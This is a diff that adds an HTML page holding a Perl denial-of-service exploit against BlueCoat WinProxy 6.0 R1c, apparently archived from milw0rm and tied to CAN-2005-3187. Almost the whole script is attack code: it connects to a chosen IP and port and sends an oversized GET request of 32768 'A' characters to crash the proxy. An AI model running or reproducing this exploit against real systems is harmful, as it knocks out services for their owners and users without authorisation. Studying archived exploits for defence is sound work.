@@ -1,0 +1,56 @@
+<html>
+<head>
+<title>BlueCoat WinProxy <= 6.0 R1c (GET Request) Denial of Service Exploit</title>
+<pre>
+#!perl
+#
+# &quot;WinProxy 6.0 R1c&quot; Remote DoS Exploit
+#
+# Author:  FistFucker
+# e-Mail:  FistFuXXer@gmx.de
+#
+#
+# Advisory:
+# http://www.idefense.com/intelligence/vulnerabilities/display.php?id=363
+#
+# CVE info:
+# CAN-2005-3187
+#
+
+use IO::Socket;
+
+#
+# destination IP address
+#
+$ip = '127.0.0.1';
+
+#
+# destination TCP port
+#
+$port = 80;
+
+
+print '&quot;WinProxy 6.0 R1c&quot; Remote DoS Exploit'.&quot;\n\n&quot;;
+
+$sock = IO::Socket::INET-&gt;new
+(
+
+    PeerAddr =&gt; $ip,
+    PeerPort =&gt; $port,
+    Proto    =&gt; 'tcp',
+    Timeout  =&gt; 2
+
+) or print '[-] Error: Could not establish a connection to the server!' and exit(1);
+
+print &quot;[+] Connected.\n&quot;;
+
+$sock-&gt;send('GET /'. 'A' x 32768 .&quot; HTTP/1.1\r\n\r\n&quot;);
+
+print &quot;[+] DoS string has been sent.&quot;;
+
+close($sock);
+
+# milw0rm.com [2006-01-07]
+</pre>
+</html>
+
